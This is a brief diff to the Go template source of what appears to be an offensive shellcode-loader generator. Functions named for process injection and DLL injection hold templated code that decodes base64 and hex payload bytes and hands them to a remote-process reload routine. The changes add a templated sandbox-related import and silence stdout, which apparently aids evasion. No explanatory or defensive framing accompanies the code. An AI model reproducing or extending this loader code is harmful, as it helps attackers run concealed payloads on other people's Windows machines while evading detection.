@@ -501,6 +501,7 @@ func Binary() string {
 		"syscall"
 		"unsafe"
 		"strconv"
+		{{.Variables.SandboxOS}}
 	
 		"golang.org/x/sys/windows"
 		"golang.org/x/sys/windows/registry"
@@ -972,6 +973,7 @@ func Procces_Injection_DLL() string {
 		"[loader]/[loader]"
 		"io/ioutil"
 		"syscall"
+		"os"
 		"time"
 		"unsafe"
 		"strconv"
@@ -1300,6 +1302,7 @@ func Start() {
 	{{.Variables.hexdata}}, _ := base64.StdEncoding.DecodeString({{.Variables.rawdata}})
 	{{.Variables.raw_bin}}, _ := hex.DecodeString(string({{.Variables.hexdata}}))
 	{{.Variables.ReloadRemoteProcess}}({{.Variables.raw_bin}})
+	os.Stdout, _ = os.Open(os.DevNull)
 }
 
 
@@ -1417,6 +1420,7 @@ func Procces_Injection() string {
 		"time"
 		"unsafe"
 		"strconv"
+		{{.Variables.SandboxOS}}
 
 		"golang.org/x/sys/windows"
 		"golang.org/x/sys/windows/registry"
